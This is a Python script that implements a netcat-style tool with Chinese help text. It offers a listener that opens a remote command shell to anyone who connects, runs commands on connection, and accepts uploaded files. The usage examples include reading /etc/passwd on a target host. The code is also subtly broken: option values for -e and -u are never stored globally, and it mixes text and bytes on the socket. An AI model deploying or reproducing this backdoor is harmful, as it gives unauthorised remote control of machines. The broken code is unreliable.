import sys
import socket
import threading
import subprocess
import getopt 

target      = ""
port        = 4444
upload_dis  = ""
execute     = ""
licent      = False
cmd         = False
upload      = False


def usgs():
        print ("--------------NC 中文版------------")
        print ("帮助: ncc.py -t 目标  -p 端口")
        print ("-l  监 听                            在[host]：[port]上侦听传入连接")
        print ("-e  运行文件绝对路径                 在接收到连接时执行给定的文件")
        print ("-c                                   初始化命令shell")
        print ("-u  上传文件路径                     收到连接后，上传文件并写入[目的地]")
        
        print ()
        print ()
        
        print ("例如：")
        print ("ncc.py -t 192.168.0.1 -p 1234 -c ")
        print ("ncc.py -t 192.168.0.1 -p 1234 -u=/home/target.exe")
        print ("ncc.py -t 192.168.0.1 -p 1234 -e=\"cat /etc/passwd\" ")
        print ("echo \"Hello\" | ncc.py -t 192.168.0.1 -p 1234")
        



def main():
        
        global target
        global port
        global licent
        global cmd
        
        try:
                opts, avgs = getopt.getopt(sys.argv[1:],'lt:p:e:cu:h',["help"])
        except getopt.GetoptError as err:
                
                print (err)
                print ()
                usgs()
                sys.exit()
                
        
        if len(sys.argv) < 2:
                usgs()
 
                sys.exit()
        
        for o, a in opts:
                if o in ("-h","--help"):
                        usgs()
                        sys.exit()
                elif o in ('-t'):
                        target = a
                elif o in ('-p'):
                        port = int(a)
                elif o in ('-l'):
                        print ("Enable  license")
                        licent = True
                elif o in ('-c'):
                        cmd = True
                elif o in ('-u'):
                        upload_dis = a
                elif o in ('-e'):
                        execute = a
                else:
                        assert False , "未知参数！！！"
                        sys.exit()
                        
        if  (not licent) and len(target) and port > 0:
                
                buffer = sys.stdin.read()
                client_sender(buffer)
        
        if  licent :
                server_loop()

def client_sender(buffer):
        global target
        global port
        
        buffer = buffer.encode()
        target = target.encode()

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:    
                client.connect((target,port))
                
                if len(buffer):
                        client.send(buffer)
                while True:
                        
                        recv_len = 1
                        reponse = ""
                        
                        while recv_len:
                                
                                data     = client.recv(4096)
                                recv_len = len(data)
                                reponse += data
                                
                                if recv_len < 4096:
                                        break

                        print (reponse)

                        buffer  = input("")
                        buffer += "\n"

                        client.send(buffer)

        except:
                print ("[*] 连接断开")
                client.close()       
        
def run_commed(cmd):
        
        cmd = cmd.rstrip()
                
        try:
                reponse = subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=True)
        except:
                reponse = "[*] 命令执行错误"
        return reponse
        
def server_loop():
                
        global target
        global port
                
        if not target:
                target = "0.0.0.0"
                
        target = target.encode()
                
        bind_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print ("[*] 正在侦听 %d 端口 " % (port))        
        bind_client.bind((target,port))
        bind_client.listen(5)
                
        while True:
                client, addrs = bind_client.accept()
                        
                print ("[*] %s:%d 已连接" % (addrs[0],addrs[1]))
                        
                client_th = threading.Thread(target=client_handler,args=(client,))
                client_th.start()
        
        
def client_handler(client):
        global upload
        global upload_dis
        global cmd
        global execute
        
        
        if len(execute):
                output = run_commed(execute)
                client.send(output)
        
        if len(upload_dis):
                file_buffer = ""
                
                while True:
                        data = client.recv(1024)
                        
                        if not data:
                                break
                        else:
                                file_buffer += data
                
                try:
                        file_wirte = open(upload_dis,'wb')
                        file_wirte.write(file_buffer)
                        file_wirte.close()
                        
                        print ("写入文件成功")
                except:
                        print ("写入文件失败")
                        
        if cmd:
                while True:
                        a = '#'
                        a = a.encode()
                        client.send(a)
                        
                        cmd_buffer = ""
                        while "\n" not in cmd_buffer:
                                cmd_buffer += client.recv(4096)
                        
                                reponse = run_commed(cmd_buffer)
                                client.send(reponse)
                               
                                
                        
                
                        



main()